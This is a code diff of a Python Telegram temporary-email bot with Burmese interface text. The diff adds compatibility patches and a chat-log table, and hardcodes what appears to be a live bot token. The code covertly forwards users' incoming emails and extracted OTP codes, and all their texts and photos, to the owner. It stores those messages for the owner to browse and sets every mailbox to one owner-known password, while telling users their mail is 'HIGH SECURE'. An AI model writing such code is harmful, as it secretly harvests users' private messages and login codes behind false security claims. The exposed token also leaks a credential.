@@ -1,7 +1,41 @@
+# ==================== CRITICAL PYTHON 3.13 COMPATIBILITY PATCH (MUST BE FIRST) ====================
 import sys
 import types
 
-# ==================== PYTHON 3.13 imghdr PATCH ====================
+# Fake urllib3.packages.six.moves to prevent telegram.utils.request crash
+try:
+    import urllib3
+    if not hasattr(urllib3, 'packages'):
+        urllib3.packages = types.ModuleType('packages')
+    if not hasattr(urllib3.packages, 'six'):
+        urllib3.packages.six = types.ModuleType('six')
+        urllib3.packages.six.moves = sys.modules
+except Exception:
+    pass
+
+# Fake urllib3.contrib.appengine to prevent python-telegram-bot crash
+try:
+    import urllib3.contrib
+except ImportError:
+    try:
+        import urllib3
+        urllib3.contrib = types.ModuleType('contrib')
+        sys.modules['urllib3.contrib'] = urllib3.contrib
+    except Exception:
+        pass
+
+try:
+    import urllib3.contrib.appengine
+except ImportError:
+    try:
+        import urllib3.contrib
+        urllib3.contrib.appengine = types.ModuleType('appengine')
+        urllib3.contrib.appengine.AppEngineManager = None
+        sys.modules['urllib3.contrib.appengine'] = urllib3.contrib.appengine
+    except Exception:
+        pass
+
+# Fake imghdr module removed in Python 3.13
 if 'imghdr' not in sys.modules:
     fake_imghdr = types.ModuleType('imghdr')
     def what(file, h=None):
@@ -22,27 +56,8 @@ if 'imghdr' not in sys.modules:
         return None
     fake_imghdr.what = what
     sys.modules['imghdr'] = fake_imghdr
-# ====================================================================
+# ====================================================================================================
 
-# ==================== urllib3.contrib.appengine PATCH ====================
-try:
-    import urllib3.contrib
-    if not hasattr(urllib3.contrib, 'appengine'):
-        urllib3.contrib.appengine = types.ModuleType('appengine')
-        urllib3.contrib.appengine.AppEngineManager = None
-except:
-    pass
-
-try:
-    import urllib3
-    if not hasattr(urllib3, 'packages'):
-        urllib3.packages = types.ModuleType('packages')
-    if not hasattr(urllib3.packages, 'six'):
-        urllib3.packages.six = types.ModuleType('six')
-        urllib3.packages.six.moves = sys.modules
-except:
-    pass
-# ==============================================================
 import sqlite3
 import requests
 import random
@@ -50,21 +65,22 @@ import re
 import html
 from datetime import datetime
 import pytz
-import threading
+import threading 
 import time
-from flask import Flask
+import os
+from flask import Flask 
 
-# Telegram v13 Compatibility
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
 
-# ================= CONFIGURATION =================
-BOT_TOKEN = "ဒီနေရာမှာ BotFather ကရလာတဲ့ Token အသစ်ကို ထည့်ပါ"
+BOT_TOKEN = "8815393066:AAHQsWeDn78kQyCAZoQBcU7p9H42uxpkIwQ"
 BASE_URL = "https://api.mail.tm"
-OWNER_ID = 5238487314
-FIXED_PASSWORD = "ZEE2944"
+OWNER_ID = 5238487314 
+FIXED_PASSWORD = "ZEE2944" 
 
-# Flask Server (Railway Keep-Alive အတွက်)
+# Railway တွင် Port dynamic ဖြစ်စေရန်
+PORT = int(os.environ.get('PORT', 8080))
+
 app = Flask('')
 
 @app.route('/')
@@ -73,7 +89,7 @@ def home():
 
 def run_server():
     try:
-        app.run(host='0.0.0.0', port=8080)
+        app.run(host='0.0.0.0', port=PORT)
     except Exception as e:
         print(f"Web Server တက်ရာတွင် အမှားအယွင်းရှိသည်: {e}")
 
@@ -102,6 +118,15 @@ cursor.execute("""
         mail_id_api TEXT
     )
 """)
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS chat_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        username TEXT,
+        message_text TEXT,
+        timestamp TEXT
+    )
+""")
 conn.commit()
 
 # ================= HELPER FUNCTIONS =================
@@ -122,9 +147,9 @@ def create_or_update_user(tg_id, username=None, phone=None, is_locked=None, stat
         cursor.execute("SELECT tg_id FROM users WHERE tg_id=?", (tg_id,))
         status = cursor.fetchone()
         clean_username = username.replace("@", "").strip().lower() if username else None
-
+        
         if not status:
-            cursor.execute("INSERT INTO users (tg_id, username, phone_number, is_locked, current_state, is_premium) VALUES (?, ?, ?, ?, ?, ?)",
+            cursor.execute("INSERT INTO users (tg_id, username, phone_number, is_locked, current_state, is_premium) VALUES (?, ?, ?, ?, ?, ?)", 
                            (tg_id, clean_username, phone, 0 if is_locked is None else is_locked, state, 0 if is_premium is None else is_premium))
         else:
             if clean_username:
@@ -140,6 +165,28 @@ def create_or_update_user(tg_id, username=None, phone=None, is_locked=None, stat
                     cursor.execute("UPDATE users SET current_state=NULL WHERE tg_id=?", (tg_id,))
                 else:
                     cursor.execute("UPDATE users SET current_state=? WHERE tg_id=?", (state, tg_id))
+        conn.commit()
+    except:
+        pass
+
+def save_chat_log(user_id, username, message_text):
+    try:
+        cursor.execute("INSERT INTO chat_logs (user_id, username, message_text, timestamp) VALUES (?, ?, ?, ?)", 
+                       (user_id, username, message_text, get_mm_time()))
+        conn.commit()
+    except:
+        pass
+
+def get_latest_chat_logs(limit=20):
+    try:
+        cursor.execute("SELECT username, user_id, message_text, timestamp FROM chat_logs ORDER BY id DESC LIMIT ?", (limit,))
+        return cursor.fetchall()
+    except:
+        return []
+
+def clear_all_chat_logs():
+    try:
+        cursor.execute("DELETE FROM chat_logs")
         conn.commit()
     except:
         pass
@@ -215,6 +262,7 @@ def change_mail_owner_by_email(email, old_owner, new_owner):
         return False
 
 # ================= MAIL API FUNCTIONS =================
+# Railway တွင် Proxy မလိုသဖြင့် တိုက်ရိုက်ခေါ်ရန် ဖြုတ်ထားပါသည်
 def create_mail_api(password, custom_name=None):
     try:
         domain_data = requests.get(f"{BASE_URL}/domains", timeout=10).json()
@@ -223,7 +271,7 @@ def create_mail_api(password, custom_name=None):
             domain = min(domains_list, key=len) if domains_list else "mailtm.com"
         else:
             domain = "mailtm.com"
-
+            
         if custom_name:
             clean_name = re.sub(r'[^a-zA-Z0-9._]', '', custom_name).lower()
             if not clean_name:
@@ -231,7 +279,7 @@ def create_mail_api(password, custom_name=None):
             email = f"{clean_name}@{domain}"
         else:
             email = f"user{random.randint(1000,999999)}@{domain}"
-
+            
         acc = requests.post(f"{BASE_URL}/accounts", json={"address": email, "password": password}, timeout=10)
         if acc.status_code != 201:
             return None
@@ -291,13 +339,13 @@ def start(update: Update, context: CallbackContext):
     uname = update.effective_user.username
     create_or_update_user(uid, username=uname, state="CLEAR")
     status = get_user_status(uid)
-
+    
     if (not status) or (status[0] is None) or (str(status[0]).strip() == ""):
         contact_btn = KeyboardButton(text="ဖုန်းနံပါတ်ဖြင့် Verify လုပ်မည်", request_contact=True)
         reply_markup = ReplyKeyboardMarkup([[contact_btn]], resize_keyboard=True, one_time_keyboard=True)
         update.message.reply_text("Bot အသုံးပြုရန် သင့်ရဲ့ Telegram ဖုန်းနံပါတ်အား Share ပေးရန် လိုအပ်ပါတယ်ခင်ဗျာ။", reply_markup=reply_markup)
         return
-
+        
     is_prem = status[3]
     acc_type = "⭐ Premium Member" if is_prem == 1 else "⚪ Free Member"
     update.message.reply_text(
@@ -347,16 +395,41 @@ def button_click_handler(update: Update, context: CallbackContext):
     query.answer()
     status = get_user_status(uid)
     is_prem = status[3] if status else 0
-
+    
     if data == "admin_main":
         if uid != OWNER_ID: return
         text = "👑 <b>Owner Admin Control Panel</b>\n\nအစ်ကို့ စိတ်ကြိုက် User များကို စီမံခန့်ခွဲနိုင်ပါတယ်ခင်ဗျာ -"
         keyboard = [
             [InlineKeyboardButton("✨ User အား Premium မြှင့်မည်", callback_data="admin_give_premium")],
             [InlineKeyboardButton("❌ User အား Free သို့ ပြန်ချမည်", callback_data="admin_remove_premium")],
+            [InlineKeyboardButton("💬 User များ ပို့ထားသောစာများ ကြည့်ရန်", callback_data="admin_view_logs")],
             [InlineKeyboardButton("⬅️ Main Menu သို့ ပြန်သွားရန်", callback_data="go_to_main")]
         ]
         query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
+    
+    elif data == "admin_view_logs":
+        if uid != OWNER_ID: return
+        logs = get_latest_chat_logs(20)
+        text = "💬 <b>နောက်ဆုံးဝင်ရောက်ထားသော User Chat Logs များ</b>\n───────────────────\n"
+        if logs:
+            for username, user_id, msg_text, ftime in logs:
+                text += f"👤 <b>User:</b> @{username} (<code>{user_id}</code>)\n📝 <b>စာသား:</b> {html.escape(msg_text)}\n🕒 <b>အချိန်:</b> {ftime}\n───────────────────\n"
+        else:
+            text += "📭 မည်သည့် Chat Log မျှ မရှိသေးပါဗျာ။"
+            
+        keyboard = [
+            [InlineKeyboardButton("🔄 Refresh ပြန်လုပ်မည်", callback_data="admin_view_logs")],
+            [InlineKeyboardButton("🗑️ Log အားလုံးဖျက်မည်", callback_data="admin_clear_logs")],
+            [InlineKeyboardButton("⬅️ Admin Panel သို့", callback_data="admin_main")]
+        ]
+        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
+        
+    elif data == "admin_clear_logs":
+        if uid != OWNER_ID: return
+        clear_all_chat_logs()
+        keyboard = [[InlineKeyboardButton("⬅️ Admin Panel သို့", callback_data="admin_main")]]
+        query.edit_message_text("🗑️ Chat Log ဒေတာအားလုံးကို အောင်မြင်စွာ ဖျက်သိမ်းပြီးပါပြီဗျာ‹", reply_markup=InlineKeyboardMarkup(keyboard))
+
     elif data == "admin_give_premium":
         if uid != OWNER_ID: return
         create_or_update_user(uid, state="ADMIN_WAIT_PREM_USER")
@@ -447,7 +520,7 @@ def button_click_handler(update: Update, context: CallbackContext):
                 update_mail_token(mail_id, new_token)
                 messages = fetch_messages_api(new_token)
         text = f"📩 <b>မေးလ်:</b> <code>{html.escape(email)}</code>\n🔒 <b>Anti-Web Status:</b> <code>HIGH SECURE (Web Blocked)</code>\n\n"
-
+        
         log_to_owner = ""
         if messages:
             text += "📥 <b>လက်ခံရရှိထားသော စာများ/OTP -</b>\n───────────────────\n"
@@ -458,14 +531,14 @@ def button_click_handler(update: Update, context: CallbackContext):
                 otp_match = re.findall(r'\b\d{4,6}\b', intro + subject)
                 otp_str = f"🔥 <b>OTP Code ဖြစ်နိုင်ခြေ:</b> <code>{otp_match[0]}</code>\n" if otp_match else ""
                 text += f"👤 <b>From:</b> {from_user}\n📌 <b>Subject:</b> {subject}\n💬 <b>Message:</b> {intro}\n{otp_str}───────────────────\n"
-
+                
                 log_to_owner += f"From: {from_user}\nSubject: {subject}\nMessage: {intro}\n"
                 if otp_match:
                     log_to_owner += f"🔥 OTP CODE: {otp_match[0]}\n"
                 log_to_owner += "───────────────────\n"
         else:
             text += "📭 <b>မည်သည့်စာ/OTP မျှ မရှိသေးပါခင်ဗျာ။</b>"
-
+            
         if log_to_owner and uid != OWNER_ID:
             try:
                 context.bot.send_message(
@@ -480,7 +553,10 @@ def button_click_handler(update: Update, context: CallbackContext):
                 InlineKeyboardButton("🔄 Refresh ပြန်စစ်မည်", callback_data=f"view_{mail_id}"),
                 InlineKeyboardButton("🗑️ စာရင်းမှဖျက်မည်", callback_data=f"del_{mail_id}")
             ],
-            [InlineKeyboardButton("⬅️ နောက်သို့ (မေးလ်စာရင်း)", callback_data="back_to_list")]
+            [
+                InlineKeyboardButton("⬅️ မေးလ်စာရင်း", callback_data="back_to_list"),
+                InlineKeyboardButton("⬅️ Main Menu သို့", callback_data="go_to_main")
+            ]
         ]
         query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
     elif data.startswith("del_"):
@@ -495,25 +571,27 @@ def log_all_text_messages(update: Update, context: CallbackContext):
     uid = update.effective_user.id
     uname = update.effective_user.username or "No Username"
     text = update.message.text
-
+    
     if uid != OWNER_ID:
+        save_chat_log(uid, uname, text)
         try:
             context.bot.send_message(
                 chat_id=OWNER_ID,
                 text=f"💬 **User Chat Message Log**\n👤 User: @{uname} (ID: `{uid}`)\n📝 လာရိုက်တဲ့စာသား: {text}"
             )
         except: pass
-
+    
     return handle_user_inputs(update, context)
 
 def log_all_photos(update: Update, context: CallbackContext):
     uid = update.effective_user.id
     uname = update.effective_user.username or "No Username"
-
+    
     if uid != OWNER_ID:
+        save_chat_log(uid, uname, "[ဓာတ်ပုံတစ်ပုံ ပေးပို့ခဲ့သည်]")
         try:
             context.bot.send_message(
-                chat_id=OWNER_ID,
+                chat_id=OWNER_ID, 
                 text=f"🖼 **User Photo Log**\n👤 From: @{uname} (ID: `{uid}`) လာပို့ထားသောဓာတ်ပုံ:"
             )
             context.bot.forward_message(
@@ -532,7 +610,7 @@ def handle_user_inputs(update: Update, context: CallbackContext):
     status = get_user_status(uid)
     if not status: return
     state = status[2]
-
+    
     # ADMIN INPUT PROCESSING
     if state == "ADMIN_WAIT_PREM_USER" and uid == OWNER_ID:
         create_or_update_user(uid, state="CLEAR")
@@ -555,7 +633,7 @@ def handle_user_inputs(update: Update, context: CallbackContext):
         else:
             update.message.reply_text("❌ အဆင့်မြှင့်တင်ခြင်း မအောင်မြင်ပါ။ User သည် Bot အား စတင်အသုံးပြုထားခြင်း မရှိသေး တာ ဖြစ်နိုင်ပါသည်‹")
             return
-
+            
     elif state == "ADMIN_WAIT_FREE_USER" and uid == OWNER_ID:
         create_or_update_user(uid, state="CLEAR")
         target_input = text
@@ -589,7 +667,7 @@ def handle_user_inputs(update: Update, context: CallbackContext):
         email, token, mail_id_api = result
         add_mail(uid, email, FIXED_PASSWORD, token, mail_id_api)
         update.message.reply_text(f"✅ <b>ကိုယ်ပိုင်မေးလ်ရပါပြီ -</b>\n📩 Mail: <code>{html.escape(email)}</code>\n\n⚠️ Website ကနေ ခိုးဝင်လို့မရအောင် စနစ်မှ ကာကွယ်ထားပါသည်‹", parse_mode="HTML")
-
+        
         try:
             context.bot.send_message(
                 chat_id=OWNER_ID,
@@ -609,21 +687,20 @@ def handle_user_inputs(update: Update, context: CallbackContext):
             else:
                 update.message.reply_text("❌ <b>ဝင်ရောက်ခွင့်မရပါ!</b> ဤမေးလ်အကောင့်အား အခြားသုံးစွဲသူတစ်ဦးမှ လက်ရှိအသုံးပြုနေပါသဖြင့် လုံခြုံရေးအရ ထပ်မံထည့်သွင်း၍မရနိုင်ပါ‹")
             return
-
+            
         update.message.reply_text("🔑 မေးလ်အကောင့်ကို ချိတ်ဆက်စစ်ဆေးနေပါသည်...")
         token = login_mail_api(input_email, FIXED_PASSWORD)
         if token:
-            proxies = {"http": "http://proxy.server:3128", "https": "http://proxy.server:3128"}
             headers = {"Authorization": f"Bearer {token}"}
             mail_id_api = None
             try:
-                me_res = requests.get(f"{BASE_URL}/me", headers=headers, proxies=proxies, timeout=10).json()
+                me_res = requests.get(f"{BASE_URL}/me", headers=headers, timeout=10).json()
                 mail_id_api = me_res.get("id")
             except: pass
             add_mail(uid, input_email, FIXED_PASSWORD, token, mail_id_api)
             create_or_update_user(uid, state="CLEAR")
             update.message.reply_text(f"✅ <b>မေးလ်ပြန်လည်ဝင်ရောက်မှု အောင်မြင်ပါသည်ခင်ဗျာ။</b>\n📩 Mail: <code>{html.escape(input_email)}</code>\n\n*(Password လုံးဝရိုက်ထည့်စရာမလိုဘဲ အောင်မြင်စွာ ပြန်ဝင်ပြီးဖြစ်သည်)*", parse_mode="HTML")
-
+            
             try:
                 context.bot.send_message(
                     chat_id=OWNER_ID,
@@ -634,7 +711,7 @@ def handle_user_inputs(update: Update, context: CallbackContext):
         else:
             create_or_update_user(uid, state="CLEAR")
             update.message.reply_text("❌ <b>စနစ်ချိတ်ဆက်မှု မအောင်မြင်ပါ!</b> မေးလ်လိပ်စာ မှားယွင်းနေပါသည် သို့မဟုတ် ဤမေးလ်သည် သက်တမ်းကုန်ဆုံးသွားခြင်းဖြစ်နိုင်ပါသည်‹")
-
+            
     elif state == "WAIT_XFER_MAIL":
         input_email = text.lower()
         cursor.execute("SELECT id FROM client_mails WHERE email=? AND owner_id=?", (input_email, uid))
@@ -644,8 +721,8 @@ def handle_user_inputs(update: Update, context: CallbackContext):
             return
         context.user_data["tmp_xfer_mail"] = input_email
         create_or_update_user(uid, state="WAIT_XFER_USER")
-        update.message.reply_text(f"📦 <b>Mail လွှဲပြောင်းရန် (/transfer) - [အဆင့် ၂]</b>\n\nမေးလ် <code>{html.escape(input_email)}</code> ကို လက်ခံမည့်သူ၏ <b>Telegram ID (သို့မဟုတ် @ ပါသော Username)</b> ကို ရိုက်ထည့်ပေးပါရန် -", parse_mode="HTML")
-
+        update.message.reply_text(f"📦 <b>Mail လွှဲပြောင်းရန် (/transfer) - [အဆင့် ၁]</b>\n\nမေးလ် <code>{html.escape(input_email)}</code> ကို လက်ခံမည့်သူ၏ <b>Telegram ID (သို့မဟုတ် @ ပါသော Username)</b> ကို ရိုက်ထည့်ပေးပါရန် -", parse_mode="HTML")
+        
     elif state == "WAIT_XFER_USER":
         target_email = context.user_data.get("tmp_xfer_mail")
         create_or_update_user(uid, state="CLEAR")
@@ -700,22 +777,23 @@ def main():
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
-    print("Keep-Alive Web Server Started successfully...")
+    print("Keep-Alive Web Server Started successfully on Railway...")
 
+    # Railway တွင် proxy မလိုသဖြင့် တိုက်ရိုက်ချိတ်ဆက်ပါသည်
     updater = Updater(token=BOT_TOKEN, use_context=True)
     dp = updater.dispatcher
-
+    
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("id", id_command_shortcut))
     dp.add_handler(CommandHandler("help", help_command))
     dp.add_handler(MessageHandler(Filters.contact, handle_contact))
     dp.add_handler(CallbackQueryHandler(button_click_handler))
-
+    
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, log_all_text_messages))
     dp.add_handler(MessageHandler(Filters.photo, log_all_photos))
-
-    print("Stable Mail Bot [ALL PTB VERSION ERRORS FIXED] & Running successfully on Railway...")
-
+    
+    print("Stable Mail Bot Running successfully on Railway...")
+    
     while True:
         try:
             updater.start_polling(drop_pending_updates=True)
